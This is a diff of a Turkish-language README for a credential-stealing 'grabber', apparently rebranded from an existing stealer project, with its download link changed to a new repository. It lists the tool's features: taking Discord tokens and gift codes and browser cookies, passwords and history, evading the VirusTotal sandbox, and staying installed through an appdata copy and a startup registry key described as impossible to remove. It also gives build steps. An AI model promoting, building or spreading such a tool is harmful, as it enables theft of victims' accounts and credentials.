@@ -13,7 +13,7 @@
     - HQ Arkadaş
     - Hediye Kodları
 - Tarayıcı Bilgileri
-    - Cookies
+    - Çerez Bilgileri
     - Şifreler
     - Geçmiş
     - Yer İmleçleri
@@ -32,8 +32,9 @@
     - Virustotal sanal alanında çalıştırılıp çalıştırılmadığını kontrol eder
 
 - Başlangıç kalıcılığı
-    - Grabber ve Stub'ı appdata'ya yerleştirin
-    - Başlangıç kayıt defterine ekle
+    - Grabber ve Stub'ı appdata'ya yerleştirir
+    - Başlangıç kayıt defterine ekler
+    - Silinmesi İmkansız Olur
 
 ## Nasıl İndirilir?
 <br>
@@ -48,7 +49,7 @@
 <details>
     <summary>Anlamayanlar İçin</summary>
     <ol>
-        <li><a href="https://github.com/addi00000/empyrean/archive/refs/heads/main.zip">Download source code zip</a></li>
+        <li><a href="https://github.com/Sercedes001/Sercedes-Grabber/archive/refs/heads/main.zip">Download source code zip</a></li>
         <li>Extract zip</li>
         <li>Run <code>install_python.bat</code></li>
         <li>Run the builder by double clicking the <code>build.bat</code> file</li>
